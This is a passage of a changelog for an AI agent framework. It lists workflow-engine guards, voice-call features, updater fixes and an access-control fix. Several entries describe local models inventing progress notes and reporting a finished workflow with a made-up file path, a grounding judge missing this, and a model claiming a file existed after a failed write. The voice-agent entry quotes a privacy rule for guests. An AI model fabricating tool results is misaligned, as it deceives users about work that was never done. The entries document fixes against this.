  endpoint map, live model discovery (both copies), the vision-capability
  check (previously three manually-synced copies that had drifted apart) and
  the CLI settings menus all read from it, guarded by new CI sync tests plus
  a factory-pinning test that locks today's behavior byte for byte. Four
  real drift bugs died in the process: the CLI provider menus did not offer
  Veyllo at all, the provider-coverage test itself skipped Veyllo, and two
  of the three vision checks did not recognize Veyllo models as
  vision-capable. Provider-specific behavior (DeepSeek reasoning fields,
  OpenAI reasoning-parameter gating, Veyllo tool-call-id handling) stays in
  gated code paths, unchanged.
- **Per-instance tool registration on the library facade.** An embedded
  `Agent` can now be handed extra tools directly: `agent.add_tool(MyTool())`
  before the first run registers a `BaseTool` for that instance only - no
  pip package, no file drop-in. Late or invalid registrations raise clear
  errors, and the facade CI guard pins the behavior.
- **A developer FAQ.** Short verified answers to the questions developers
  actually hit: Docker requirements, the confirmation-gate error string,
  thread-safety, the engine's return contract, log redirection, custom
  endpoints, the tool lanes, and what the alpha stability promise covers.
- **A runnable examples/ directory.** Five self-contained artifacts for the
  embedding surface: the five-line quickstart, streaming plus the structured
  event sink, driving VAF as a subprocess via the NDJSON output format (the
  pattern for non-Python integrations), per-instance tool registration, and
  a complete pip-installable custom-tool package using the entry-point
  mechanism. A CI test keeps every
  example compiling and the example tool loadable, and the license-header
  check now covers the examples tree.
- **A CI guard now protects the public library surface.** The docs promise
  that `from vaf import Agent` is safe to build on; until now no test
  imported that facade, so a breaking change to it could have shipped with
  a green CI. A new executable contract pins the facade exports, the
  `Agent`/`run()` signatures, the `BaseTool` declarative defaults, and the
  pip entry-point tool discovery (`vaf.tools` group).
- Setting up a voice profile no longer stalls on slow connections: the
  speaker-engine models (26 MB) now download in the background during the
  enrollment intro instead of blocking the first round.

### Changed
- **Voice call, guest privacy**: on a live call with an enrolled voice profile, a guest
  (a speaker the voice check does not verify as you) who talks to the agent now gets a
  reply built WITHOUT your private context - your chat digest, your memory, and the
  prior call history are all withheld from that turn entirely, not just guarded by a
  prompt rule, and the agent is told to help only with general questions and never share
  your memory, notes, schedule, messages or contacts. So a guest cannot make the agent
  replay your earlier turns by asking "what did you just say?". Tool actions already
  stayed yours alone; this closes the matching information side.

### Fixed
- **A finished workflow now tells the model, imperatively, not to redo the
  work.** A verified successful run (finished HTML on disk) was followed
  by the model rebuilding every step manually and reporting total failure
  - it had skimmed past the bare success banner. Both completion messages
  now lead with an explicit directive (work is done; do not redo steps,
  re-run searches or rebuild files; present the results and file path)
  before the output and the per-step summary. The docs also gained an
  honest "small local models - known behavioral limits" section
  (PROVIDER_MODES.md): redo-after-success, narrated intentions and
  round-trip fragility are model limitations the framework mitigates but
  cannot remove; assigning a stronger sub-agent/coder model
  (subagent_model) is the user-facing lever.
- **A workflow step's instruction survives the presence of extra
  parameters.** The retest's model authored a step exactly the way the
  tool schema teaches - instruction in input, extra parameters in args
  ({"max_results": 3}) - and the engine built the tool call ONLY from
  args, silently dropping the input: web_search ran without a query and
  the whole run failed with "Error: No query provided." The resolved
  input now fills the tool's missing primary parameter; steps whose args
  already carry it (every saved template) are untouched.
- **A workflow's completion message shows the real work of every step, and
  three templates no longer end on a filesystem agent asked to write
  prose.** A retest run succeeded end to end (11-minute coder step, HTML
  written) - but the template's final step asked the librarian agent, a
  FILESYSTEM agent, to "write a short completion message ... where the
  file was saved". It parsed that as a file search and returned "No files
  found matching '*was*'", which became the workflow's final output. The
  model read that next to "completed successfully", concluded the run
  produced nothing, and redid every step manually - 42 steps, three
  duplicate deliverables. The librarian completion step is removed from
  research_and_code, generate_docs and create_file (the save step's own
  "File written successfully to <path>" is the honest completion), and
  both completion messages (saved workflows and temporary ones) now
  append a bounded per-step result summary, so one weird step can never
  hide the actual deliverables again.
- **The validation question no longer costs the workflow run - the system
  answers it itself.** When a temporary workflow's content steps carried
  no validate flags, run_temp bounced with "[VALIDATION CHECK] ... call
  run_temp again with the flags or skip_validation". A live retest showed
  a weak model bouncing off that twice (retrying without the flags both
  times) and then doing every step manually while its correctly authored
  workflow never ran. Validation on deliverable steps is exactly what the
  bounce text recommended - so run_temp now enables it on those steps
  automatically and runs; skip_validation stays the explicit opt-out.
- **A temporary workflow with mangled step field names is repaired instead
  of rejected.** The retest's model got everything right except the step
  FIELD NAMES: tool in "action", instruction in "description", no "input"
  - and the nested schema requirement rejected the entire call with
  "'input' is a required property", a message the model could not act on;
  it regressed into planning spin until the loop guards ended the turn
  with nothing produced. Steps are now repaired before validation (tool
  also accepted from action/agent_id; input falls back through
  task/prompt/instruction/query/description/name; args-only steps get a
  synthesized label), the hard nested requirement is gone, and a step
  with truly nothing usable gets a targeted error instead of a schema
  dump. Applies to temporary and saved workflow authoring alike.
- **A model can no longer talk itself into believing its own fictional
  diary.** Two consecutive retest chats failed the same way: the model
  narrated its INTENTIONS into working-memory notes ("Web-Suche: läuft",
  "Workflow wurde erfolgreich gestartet") without calling one real tool;
  the working-memory block re-injected that fiction as trusted context,
  the anti-spin guard then forced a text-only turn whose wording ("state
  your result") invited a result, and the model coherently reported a
  finished workflow with an invented file path. The result-grounding
  judge (the same small local model) waved it through. Four guards now
  close the loop end to end: (1) a note firewall refuses outcome- or
  progress-claiming notes while no real tool has run this turn (facts,
  not intentions - the note is re-fed as truth later); (2) result
  grounding gained a deterministic rule that needs no LLM judge: a final
  reply asserting tool outcomes after a bookkeeping-only turn is
  ungrounded by construction (purely conversational recap turns still go
  to the judge); (3) the anti-spin escalation now explicitly forbids
  claiming results and demands an honest still-open answer; (4)
  working-memory timestamps are rendered in the user's timezone in the
  prompt (they were UTC, so the model misdated its own recent actions by
  hours).
- **A healthy coder inside a workflow is no longer executed at minute
  five.** The generic sub-agent hard cap (300s) applied to workflow steps
  too, and killed a perfectly healthy coding-agent step mid-loop - linter
  green, actively streaming - with SIGTERM, failing the whole workflow at
  its last step (live incident). Heavy agent steps (coder, research,
  document) inside a workflow now get a worst-case floor of 30 minutes
  (workflow_agent_step_timeout_seconds); this is safe because a dead or
  stuck child is caught much earlier by the heartbeat liveness guard
  (~60s) - the hard cap is only the absolute-runaway backstop, and it was
  doing the killing instead. All other tools keep their normal budgets.
- **The SubAgent window no longer opens on top of a running workflow.**
  The intended design routes an embedded sub-agent step's output into the
  workflow panel's terminal, and the window-open helper honors that - but
  the sub-agent heartbeat handler set the window open directly, bypassing
  the guard, so the coder step opened a duplicate window next to the
  runtime panel. The heartbeat path now carries the same workflow guard;
  a manual open by the user still works.
- **The plan gate no longer bounces a workflow launch - the launch IS the
  plan.** The retest showed the exact cost of that bounce: the model
  committed to execute_workflow with the suggested template, got
  [PLAN REQUIRED], dutifully set a plan - and then did the steps manually,
  the workflow forgotten. A saved template id or a run_temp steps list is
  precisely the approach the gate exists to demand, so the gate now seeds
  working memory's plan from the launch call itself (observability
  preserved, placeholder detection unaffected) and lets it through.
  Launch calls without a plan payload (list/delete actions) still bounce,
  and every other state-changing tool is gated unchanged.
- **The duplicate-call guards now cover text-recovered tool calls too.**
  The in-batch dedupe and the windowed redundant-read check lived inside
  the streamed-call loop, but a weak local model's calls often arrive via
  the text-recovery fallback parsers, which bypassed both - the retest
  ran the same two searches twice within one second out of a
  fallback-parsed batch. Both checks moved into one cross-lane filter
  that runs after every parsing lane and before the calls are committed
  to history, so streamed and recovered calls get identical protection.
- **A temporary workflow's final build step now actually receives the data
  the earlier steps gathered.** The engine passes step results only through
  explicit placeholders in the next step's template - and a weak model
  reliably NAMES its outputs but never references them: the retest's
  workflow ran both web searches perfectly and then told the coder "use
  the results from the previous searches" in prose, with no placeholder
  anywhere. The coder received zero data and, correctly following the
  strict factual-data policy, rendered [DATA NOT FOUND] into every field
  of an otherwise finished page. When a task-consuming agent step (the
  coding agent, document writer, document agent, librarian and browser
  agents - builders and analyzers alike) references no prior step output,
  the engine now auto-attaches a bounded digest of the actual results to
  that step's instruction, in every lane the engine runs (temporary
  workflows, saved templates, the CLI lane, automations). The research
  agent is deliberately excluded (its input is a short topic query, and
  its job is producing data, not consuming it); templates that DO
  reference outputs - every saved template - are never touched. The
  authored step list of a temporary workflow is now also logged in full,
  since during the forensic it existed nowhere.
- **A pending background question can no longer hijack the user's next
  request.** The proactive thinking pass asks questions over the user's
  messenger and latches "waiting for a reply" per user. When the user
  then typed a brand-new task into a fresh chat, the pickup classified
  it as THE reply: the model got told "the user answered your background
  question", blended both topics (they happened to be similar), replied
  over the messenger unprompted, and the reply-confirmation gate then
  blocked the user's own workflow-builder calls twice - the turn ended
  after 27 confused steps with a stale answer, although the task had
  been completed midway. Three fixes: (1) the pickup lane now reads the
  RAW message - the WebUI workspace preamble had defeated the leading
  -text confirmation check (proven: raw "Okay fuehre bitte..." passes,
  enriched fails) and was even stored as the recorded reply; (2) the
  reply is classified three-way - short yes carries the proposal, short
  no declines it, and a LONG task-shaped message counts as a NEW topic:
  light context note only, no "carry out the proposal" framing, and the
  mutation gate stays disarmed so the user's own request is never
  confirmation-blocked; (3) a TTL safety net (default 12h) expires a
  stale waiting latch at read time, since the regular 10-minute skip
  only runs while thinking runs actually fire.
- **A model that builds the right workflow in the wrong wrapper now gets
  its own call handed back to copy.** Follow-up to the routing fix below,
  from the retest: the model merged the two workflow hints into
  execute_workflow(workflow_id="create_agent_workflow", variables={action,
  steps}) - a complete, CORRECT temporary-workflow payload inside the
  wrong tool. The prose-only redirect explained the mistake, and the
  model gave up on workflows and did every step manually. When the
  mistaken call carries usable steps, the redirect now echoes the exact
  create_agent_workflow(...) call to copy, arguments verbatim - weak
  models copy reliably but rephrase poorly. Still a message, never an
  auto-forward.
- **Verbatim re-runs of a lookup that already succeeded this turn are
  refused, and an identical duplicate within one response is dropped.**
  The redundant-call guard compared a new tool call only against the
  newest tool message, so a single interleaved call (a failed workflow
  attempt, a plan-gate bounce) hid an exact repeat from it - the same
  retest burned four calls re-running two web searches word for word,
  including the same search accepted twice in one second (for a send
  tool that same hole would have meant a double-send). Pure lookups
  (searches, reads, listings) whose identical call already succeeded in
  the current turn are now refused with a pointer to the existing
  result, EXCEPT when a mutating tool succeeded in between (a re-read
  after a write is legitimate; the guard fails open). Exact duplicates
  within one model response are dropped silently for all tools - one
  logical call, one result.
- **The workflow router routes on what the user actually said.** The WebUI
  lane prepends a workspace context preamble to the user message before the
  agent runs, and the workflow router matched templates against that
  combined text: the preamble's wording (coding_agent, projects,
  write_file) steered a plain websearch-and-HTML request to a CODE
  workflow, and the variable extractor stuffed the entire preamble into
  the workflow's query variable (live incident: a 44-step turn in which
  the model rightly declined the garbage suggestion and then did every
  step manually). Routing decisions - the template match, variable
  extraction, the explicit workflow parse, workflow-mention detection,
  language detection and the intent lock - now run on the raw,
  pre-enrichment message; the LLM still sees the enriched text.
- **A wrong template match can no longer eat an explicit workflow
  request.** The run_temp advisory used to exist only in the no-match
  branch, so when the router matched ANY template (even a bad one) for a
  message that explicitly asked for a workflow, the suggestion block was
  the only workflow path shown. When the user's own message mentions a
  workflow, the suggestion now also offers
  create_agent_workflow(action='run_temp') as the fallback - advisory,
  with the same typo-tolerant detection both hints share.
- **Two more weak-model argument names are repaired instead of rejected.**
  The same incident burned eight calls on schema rejections: write_file
  with file_content instead of content (four times) and python_exec with
  task instead of code (twice). Both observed names (plus contents and
  script) are now in the tools' alias maps, so the call is repaired and
  dispatched on the first attempt.
- **A tool call is no longer silently dropped when a model garbles its own
  closing tags.** The recovery parser for text-written tool calls (a
  reasoning model sometimes emits `<tool_call><function=NAME>...` as plain
  text instead of a native call) required an exact
  `</function></tool_call>` close to accept anything. A live case showed a
  local model trail off into hallucinated, unrelated closing tags instead
  of its own; the properly-closed parameter inside was perfectly
  recoverable, but the strict match returned nothing and the turn ended
  with tool-call-shaped text visible in history and no tool ever actually
  invoked. Three earlier drafts of this fix failed adversarial review
  with real false-positive execution risk (one could dispatch a
  destructive call out of a model's PROSE about the syntax if ordinary
  HTML appeared later in the reply; one silently dropped a legitimate
  parameter whose value merely mentioned closing-tag-shaped text; one
  accepted a single wrong-named closing tag, which an example wrapped in
  a code block satisfies by construction). The shipped design parses
  parameters one at a time, each bounded only by its own `</parameter>`;
  a strict close is accepted anywhere, while lenient recovery requires
  the call to start at a line start AND either two-plus consecutive
  wrong-named closing tags sitting immediately (whitespace only) after
  the last parameter, or the next `<tool_call>` beginning right there
  (back-to-back calls with the first close forgotten - recovering those
  was itself a review finding, they previously vanished silently). A
  well-formed call parses exactly as before, the incident's malformed
  close is recovered, and inline mentions in prose or markup are
  rejected.
- **A request to "build a workflow for this" no longer gets talked out of
  it.** When the router finds no SAVED workflow template for a request
  (most requests - templates are a fixed catalog, not every task fits
  one), the fallback hint told the model "most simple requests (weather,
  news, questions) don't need workflows" and pointed only at
  `list_workflows` (saved templates only) - never at the ad-hoc builder.
  A user who explicitly asked to run a weather lookup as a temporary
  workflow got a hint that contradicted their own request almost word
  for word, and the model complied with the hint over the user (live
  incident). The no-match hint now detects a workflow mention in the
  user's own message (typo-tolerant - the real request had "workflow"
  mistyped as "workflwo") and surfaces
  `create_agent_workflow(action="run_temp")` as the option to use
  instead; the detection is a cheap substring match that can also fire
  on an unrelated mention ("workforce", "my daily workflow" as small
  talk), so the wording stays advisory either way - it defers to the
  model's own judgment rather than pushing a directive - and now warns
  in both branches that `run_temp` needs 2+ chained steps, matching the
  tool's own single-step rejection.
- **Every chat now shows its workspace-folder chip immediately, and an
  unused one no longer lingers forever.** The chip is "this chat has its
  own workspace" - a standing affordance, not a "you already saved
  something" indicator - so opening a chat now creates its (empty)
  workspace folder right away instead of only after a tool happened to
  write into it. To avoid littering the projects folder with abandoned
  empty directories, deleting a chat now also removes its workspace
  folder when it is still empty at that point (a folder holding real
  content is left untouched either way).
- **The delete-time workspace cleanup got two safety rails** (audit
  findings on the entry above). While a sub-agent or workflow is still
  running for the chat, deleting the chat skips workspace removal
  entirely: the run may drop its first output file between the "is it
  empty" check and the removal, and files must never be deleted out from
  under a live run. And the recursive emptiness check now surfaces
  unreadable subdirectories instead of silently skipping them (the
  underlying directory walk ignores permission errors by default), so a
  permission-denied subtree full of files can no longer classify the
  whole workspace as "empty" and get it deleted - anything that cannot be
  fully inspected is kept.
- **A session without a recorded owner is no longer treated as owned by
  everyone in the workspace endpoints.** The HTTP workspace lane (browse,
  upload, file delete, plus the image-describe session cache) accepted
  any authenticated user as the owner of a legacy session that predates
  user scoping, while the WebSocket gate treats exactly those sessions as
  admin-only - so on a multi-user server, a non-admin user could browse,
  upload into, create, or delete files inside such a session's workspace.
  Both HTTP checks now enforce the same rule as the WebSocket gate:
  scopeless sessions are admin-only, admin detected role-aware. Scopeless
  sessions were not purely theoretical: an automation delivering to a
  messenger contact BEFORE that user ever wrote inbound created the
  channel session without an owner scope (the inbound lane always stamped
  it; the two outbound-first creators did not, despite having the scope
  in hand) - those sessions are now stamped with their owner at creation,
  so their real owner keeps normal access on multi-user servers instead
  of falling into the admin-only legacy bucket. Pre-existing scopeless
  session files on disk stay admin-only in both lanes, exactly as the
  WebSocket gate already treated them.
- **A local model calling the wrong "workflow" tool now gets redirected,
  not just a template list.** `execute_workflow(workflow_id=...)` takes a
  saved template id; a weak model tried
  `workflow_id="create_agent_workflow"` - the NAME of the other workflow
  tool, not a template - and got a plain "not found" listing that didn't
  explain the actual mistake. Both tools' descriptions are now explicit
  about the distinction, and the error message detects a live tool-name
  collision and points at the right tool to call instead.
- **A failed tool no longer reports itself to the model as "OK".** The
  per-turn tool-context summary (what the model reads to know what its
  tools did) labeled failures by an out-of-date heuristic that missed the
  standard `Tool Error:` / `Security Error:` / `[PLAN REQUIRED]` prefixes,
  so a failed `write_file` showed as `-> OK: Tool Error ...`; a local model
  then told the user the file existed when it did not (live incident). The
  three copies of the "is this a failed tool result" check (retry guard,
  per-turn summary) now share one prefix-anchored helper so they cannot
  drift again. A follow-up adversarial review of that fix then found the
  shared detector covered only a handful of the failure shapes shipping
  tools actually return; a repo-wide sweep added roughly thirty more
  currently-live families (the `[BLOCKED]`/`[HOST]`/`[SECURITY]` gate
  markers, the filesystem `Access denied:`/`Invalid path` refusals, the
  messaging "unavailable:" family, "X failed:" shapes, MCP/HTTP error
  idioms, connection preconditions, unimplemented-stub replies, and the
  banner-prefixed python runner marker), each pinned by a test built from
  the tool's real return string. A third adversarial pass then caught the
  first version of THAT expansion over-rotating: it scanned whole results
  with free substrings, so a successful `read_file` of a log mentioning
  "connection failed:" rendered as a failure (10/10 realistic
  content-carrying reads misclassified). The shipped detector therefore
  anchors every family that starts the message, bounds banner-tolerant
  markers to the first 200 characters, gates stub-reply phrases on the
  result being short, and pins the content-carrying success class with
  its own tests. The three thinking-mode soft-block nudges now lead with
  `[BLOCKED]` so a blocked gather call also reads as blocked instead of
  green.
- **Common weak-model argument-name mistakes are now repaired.** A local
  model called `write_file` with `file_path`/`message` instead of
  `path`/`content`; the call failed schema validation and the write was
  lost. Tools can now declare an `input_aliases` map (kept off the model-facing
  schema so no provider can reject it), and the input-repair layer remaps a
  present alias to the canonical name before dispatch (conservatively:
  never overwriting a supplied canonical key, never guessing between two
  aliases). `write_file` maps the obvious path/content synonyms.
- **Stop now actually stops a running web search.** Stopping a turn
  abandons the tool's worker thread (Python cannot kill threads), and the
  abandoned search kept crawling pages and calling the local model for
  summaries long after the stop - occupying the single llama server with
  dead work. The runner now hands every bounded worker a cancellation
  signal that, unlike the shared stop flag, cannot be cleared out from
  under it; the web search checks it before every page read, every
  summary call and the final synthesis, and exits early. Bonus fix found
  in the same logs: those summary calls burned their whole token budget
  on reasoning and returned empty text on thinking-capable local models -
  tool-side utility completions now disable thinking, like the voice lane
  already did.
- **A workflow cannot be started twice for the same chat anymore.** After
  an empty-response recovery reset, a local model could forget it had
  already delegated and call the same workflow again while the first run
  was still live (observed: two concurrent research workflows sharing one
  GPU). Both launch lanes now check the session's live tasks and refuse a
  duplicate with an honest still-in-progress status, mirroring the
  sub-agent re-delegation guard. An adversarial re-audit then found the
  first version of that guard structurally broken for the in-process
  `execute_workflow` lane: it read the task registry but the tool never
  registered its own runs there, so two concurrent calls both sailed past
  it (verified with a live repro). The tool now registers itself for the
  duration of the run (deregistered on every exit path), both lanes share
  one guard predicate, and that predicate also counts a freshly-created
  task whose spawned terminal has not reached "running" yet, closing the
  spawn-window race in the terminal lane. A second adversarial pass on
  the fix itself then forced two more rounds of hardening: the
  registration now heartbeats (without one, the zombie reaper failed it
  90 seconds into exactly the multi-minute runs the guard protects,
  silently reopening the guard and queueing a spurious crash report), and
  both lanes verify AFTER registering who won the registry slot, since
  the pre-check alone still let two barrier-synced concurrent calls both
  through. The tool's cleanup also consumes any result another actor
  (stop-all, a reaper) queued for its task id while it ran, so a
  synchronous run can never additionally surface as a phantom sub-agent
  delivery. A failed terminal spawn now deregisters its task and falls
  back to inline execution instead of reporting an async run that never
  started.
- **Sub-agent task registry updates can no longer erase each other.** The
  IPC task queues (pending/active/results) are JSON files mutated by
  read-modify-write sequences whose per-file locks only covered a single
  read or write - two concurrent mutations (for example two tasks being
  marked running at once) could interleave and silently drop one side's
  update, observed live as two workflow launches erasing each other's
  registry entry and both slipping past the duplicate guard. All registry
  mutations now serialize through one reentrant in-process lock plus a
  bounded cross-process file lock held for the whole read-modify-write,
  with a best-effort fallback (a stuck lock degrades to the old behavior
  after five seconds rather than wedging a chat turn).
- **The workflow terminal stream no longer freezes the app window.** When a
  workflow step drew a live progress animation (the research agent), every
  animation frame line was forwarded to the Web UI as its own event -
  hundreds per second, full of raw ANSI color codes - until the page froze
  and the WebSocket dropped (live incident). The mirror now enforces ticker
  semantics at the emit site: ANSI escapes stripped, empty animation frames
  and duplicate redraws dropped, and a hard rate cap with an honest
  "[... N lines skipped]" marker. The real terminal still shows everything.
- **`vaf prompt` works in local mode now.** Both scripting lanes
  (`vaf prompt` and the `vaf run prompt` alias) never loaded the local
  model, so every local-mode invocation returned an empty answer - the
  same bug class as the library-facade fix below, found by pre-push smoke
  testing and verified live against real hardware (model load, NDJSON
  stream, server reused by the running app afterwards).
- **Workflow steps run the sandbox under the calling user's scope.** The
  workflow engine's own tool-argument injection (a deliberate narrower
  copy of the agent dispatcher) did not cover the sandbox tool; its
  per-user container work directories now key on the user in workflow
  runs too, and a CI guard pins the engine copy's coverage.
- **Embedding a local model actually works now.** The documented library
  quickstart with the local provider silently returned an empty string: the
  facade never loaded the model, so the turn aborted before generation. The
  facade now downloads/starts (or reuses) the one local llama server on
  first use, exactly like the CLI does. Also corrected in the embedding
  guide: the real location of the trust store (the platform config dir, not
  the VAF home dir) and the fact that the "system" permission level bypasses
  the confirmation gate rather than triggering it.
- **Documentation corrections across the developer docs**, each verified
  against the code: the embedding guide now names PySide6 (not PyQt6) in
  the desktop extra and includes the `veyllo` provider; the memory doc no
  longer claims "all memory content" is encrypted at rest (embedding
  vectors and titles/tags metadata are not - the encryption section
  spells out exactly what is and is not); the contributing guide's lint
  and format instructions now match what CI actually gates on instead of
  commands that would reformat 480 files; the architecture doc reconciles
  the "stable surface" promise with the alpha status and links the
  backward-compatibility rules; the Web UI flow doc's log-directory
  resolution order matches the code; the tools guide recommends native
  MCP server registration over the raw low-level tool, and its FAQ now
  covers all three tool lanes (in-tree, update-surviving `custom_tools/`,
  pip entry points); the docs index describes server mode correctly and
  lists three previously missing pages; the config reference gains rows
  for `anthropic_prompt_cache`, `anthropic_thinking`, and the
  `ux_auto_open_*` keys.
- **Voice-profile enrollment works on fresh installs.** Setting up a voice
  profile answered "I could not hear speech" on every round of a clean
  install while the microphone was fine: the speaker-identification engine
  (sherpa-onnx) was never a declared dependency - it is in requirements
  now (hash-pinned lock refreshed) and in the `speech` extra. Two more
  layers of the same incident: the voice-activity model is now downloaded
  by the VAD path itself (the first enrollment round used to fail on a
  missing model file even with the engine installed), and an engine
  failure is spoken as its own message ("the voice-profile engine is not
  available - this is not about your voice") instead of sending the user
  into a speak-louder loop. The microphone WAV converter is also unified
  into one shared implementation that writes the recording's actual sample
  rate into the header (older WebKit builds ignore the requested 16 kHz
  and would have produced files whose header lied about the audio).

## [0.1.0a14] - 2026-07-16

### Fixed
- **The a12 updater self-heal never actually fired - fixed for real.** The
  live verification on a Mac caught it: the updater's git wrapper strips
  its output, the dirty-line parser read paths at a fixed offset, and the
  lockfile churn was misread as a real user edit - so updates kept
  aborting despite the a12 fix. The parser is position-independent now,
  the restore uses exact paths, and the test suite gained an end-to-end
  test through a real git repository (the fixture shape that would have
  caught this). Stuck installs still need the one-time
  `git checkout -- web/package-lock.json` before their old updater can
  reach this version.

## [0.1.0a13] - 2026-07-16

No functional changes: a verification release. Updating a12 to a13
exercises the fixed updater end to end on a real install - the npm
lockfile self-churn restore, the forced tag fetch and the renormalized
line endings must carry an update through without any manual step.

## [0.1.0a12] - 2026-07-16

### Fixed
- **`vaf update` can no longer deadlock itself.** Three causes found on a
  Mac that sat on a7 while four newer releases existed: (1) the updater's
  own npm step (and the first-run frontend install) rewrote
  `web/package-lock.json`, and the dirty-tree pre-check then refused every
  future update - npm runs `ci` now (never modifies the lockfile), and the
  pre-check restores updater-managed files instead of aborting on them;
  real user edits still abort. (2) Release tags that were ever recreated on
  the remote made `git fetch --tags` fail mid-update with a rollback - tags
  are fetched with `--force` now. (3) Two shell scripts were stored with
  Windows line endings despite their `eol=lf` attribute, so a fresh checkout
  started dirty - the repository is renormalized. If your install is
  currently stuck on an old version, run `git checkout -- web/package-lock.json`
  in the VAF folder once, then `vaf update`.

## [0.1.0a11] - 2026-07-16

The voice release: the live call becomes a first-class citizen on local
single-model setups - its own configurable model lane (Gemma 4 E4B as the
recommended voice model), local vision, a real level meter with a noise
gate, owner-approved adaptive voice learning, and a long list of hardening
fixes found in live testing.

### Added
- **Speaker confirmation with a named voice DB.** When speaker identification
  scores a voice as "unsure", VAF now asks the owner to confirm - via the main
  messenger (question + audio segment attached) or, without one, via a card in
  the web chat (audio player, yes/no, optional name). Answering "no, that's
  Peter" stores the voice as a named third-party profile in the per-user voice
  DB, and future utterances by that voice are labeled `[Peter]:` for the agent.
  The owner's own profile is never modified by an answer, named speakers can
  never trigger delegations, at most one question is pending per user, and
  replies on messengers are consumed without starting an agent turn.
- **Recognition test with threshold calibration (Settings > Voice).** Record a
  few seconds and see who the system detects, with score, threshold and
  uncertainty band visualized; admins tune the threshold with a live slider.
  Judging results as correct or wrong feeds a per-user calibration store that
  suggests a threshold from your own voice data. (Owner-confirmed clips
  additionally sharpen the voice profile since the adaptive-learning change
  below.)
- **First-call enrollment offer.** Clicking the call button without a voice
  profile now offers the guided enrollment (with the security rationale) or a
  remembered "call without profile" skip; after a successful setup the call
  starts directly. The voice profile is loaded on connect, and the
  recognition-test verdict flow is click-only: "Who was it then?" with
  Me / Someone else buttons - a name is only typed (optionally) for someone
  else, and every path now feeds the threshold calibration.
- **The voice agent knows when NOT to answer.** The live-call mic is always
  open, so utterances are now gated before they cost anything: side talk from
  other speakers (no agent address) and garbled speech-recognition noise never
  reach the LLM or the speakers - the text still enters the call context so
  the agent knows what happens in the room. For the owner's own side talk the
  model can answer with a silence marker in the same call that would have
  answered anyway (no extra LLM turns, no added latency).
- **Live calls work in local mode by time-sharing the one model.** Without an
  API provider the voice agent now talks to the local llama server directly,
  and the single model is shared instead of doubled: the voice agent has it
  first, and while a delegated task runs for the main agent the call goes
  temporarily mute - dimmed avatar, centered muted-mic badge and a "the model
  is working for the main agent" status, with turns paused on both ends until
  the result is spoken. A call started with no model at all keeps the
  distinct "no model available" state.
- **The voice agent can run its own model.** Settings > Voice (admin) now
  offers three choices for the live call's language model: same as the main
  agent (default, unchanged), a dedicated local model - recommended and
  preset: Gemma 4 E4B, whose spoken German third-party tests rate as
  noticeably more natural than Qwen's - or a separate API provider. With a
  dedicated local model the single llama server swaps models instead of
  running two: the voice model holds it during the call, the main model
  takes it back while a delegated task runs, and a safety belt makes sure a
  main-agent turn never runs on the voice model. The voice model downloads
  on the first call (about 5.4 GB for the default) with the usual progress
  banner.
- **Local vision: the local model can see images itself.** Settings > AI >
  Vision now offers "Local": the llama server is launched with the model's
  vision encoder (mmproj, about 650 MB, downloaded automatically from the
  model's own repo), and image descriptions plus the analyze_image tool run
  fully on-device - no cloud provider needed. Works with the Qwen3.5 default
  models and Gemma 4; the encoder size is budgeted into the VRAM context
  math and per-image context cost is capped. Takes effect on the next model
  start after enabling.
- **Wake word: calling the agent by name always gets an answer.** The live
  call sometimes chose silence when the speaker was not recognized or when
  the agent was addressed directly. An utterance that says the agent's
  persona name (fuzzy-matched, so speech recognition garbling like "Charvis"
  for "Jarvis" still counts) now always engages - for any speaker - and the
  model is told it was addressed and must answer instead of staying silent.
  The security rules are untouched: an unverified voice still cannot trigger
  delegations or get private information. The voice agent also carries its
  persona now: it introduces itself with the configured agent name (Settings >
  Persona) instead of a generic "VAF", and a compact excerpt of the Soul
  keeps it in character on the call.
- **Vision keeps working during a live call, calls load the model without
  the desktop tray, and the agent's bars are real too.** With local vision
  enabled, the dedicated voice model (Gemma 4 E4B can see) now loads its own
  vision projector when it takes the server, so image questions work
  mid-call; auto-downloaded projectors get per-model filenames (Qwen and
  Gemma both ship "mmproj-F16.gguf" - a shared name would have paired the
  wrong projector after a model swap). Starting a call now loads the local
  model directly in the backend instead of relying on the desktop tray's
  activity watchdog - headless/server installs get the self-healing call
  start too. And the gray bars while the agent speaks now show the agent's
  actual output level (shared analyser with the avatar's eye pulse) instead
  of an animation.
- **The call bar waveform is a real level meter now, with a draggable noise
  gate.** The red bars during a live call show your actual microphone
  amplitude (same mechanism as the recognition test) instead of a random
  animation - muting flattens them naturally. A slider line sits inline in
  the meter, exactly on the color boundary: everything left of it is gray
  and IGNORED (not recorded), only audio that swings past it is red and
  processed. Drag the line (it lights up on hover, chevron handles, with an
  inline explanation below the bar) to tune out background noise; the
  setting persists and takes effect live, mid-call. Also fixed on the way:
  the call UI re-rendered on every animation frame while speaking (the
  voice-activity loop wrote the store per frame), which made the whole call
  feel laggy - state now only updates on real speaker transitions, and the
  meter keeps one audio pipeline for the whole call.
- **The live call follows your spoken language.** Speak Turkish and the
  agent answers in Turkish with the Turkish voice - per turn, whenever the
  language is installed in the text-to-speech stack (cloud voices count as
  multilingual; never a surprise download mid-call). The call's base
  language now also honors the configured default language instead of only
  the browser locale, and the "is that your voice?" confirmation card is a
  centered dialog now instead of a top bar.
- **Voice delegations are marked in the chat.** A task the voice agent hands
  to the main agent now renders as its own message: a red-ringed bubble with
  a soft glow and a "voice agent" tag next to the timestamp, instead of
  looking like a typed user message. The tag is persisted with the session,
  so the styling survives reloads. The delegation prompt rule is also a
  blanket one now - every request that needs a tool, live data or an action
  goes to the main agent (verified against the local model: weather, mail
  and news requests delegate; clock questions and small talk do not).

### Fixed
- **Confirming "yes, that was my voice" now actually teaches the system your
  voice.** Answering the confirmation question (web card or main messenger)
  previously only relabeled the segment; now the confirmed segment flows
  into your voice profile as an adaptive sample - with guardrails: a
  similarity floor rejects noise segments, at most ten adaptive samples
  count (oldest age out), the original enrollment keeps 70 percent of the
  weight, and re-enrolling resets everything. Authorization still never
  comes from audio: only your authenticated answer can trigger a profile
  write (kill switch: `speaker_id_adaptive_enabled`). The voice agent also
  remembers twice as much of the call now - a slicing bug fed the model
  only the last 4 exchanges instead of the stored 8.
- **The call bar keeps one size, and the workflow terminal stops flooding
  the page.** The live-call bar no longer jumps 44 pixels wider when no
  stop button is shown (the button slot stays reserved during a call), and
  the workflow window's terminal caps every output entry at 500 characters
  (a single sub-agent output block could be tens of kilobytes; hundreds of
  those made the whole page lag - full outputs remain in the logs).
- **Three live-call bugs on local single-model setups.** Quitting the tray
  now really stops the llama server: after a model swap the running server
  belonged to a helper, and the quit path only looked at its own stale
  process handle, so the model survived until `vaf stop`. A live call is
  pinned to the chat it started in: switching chats mid-call no longer
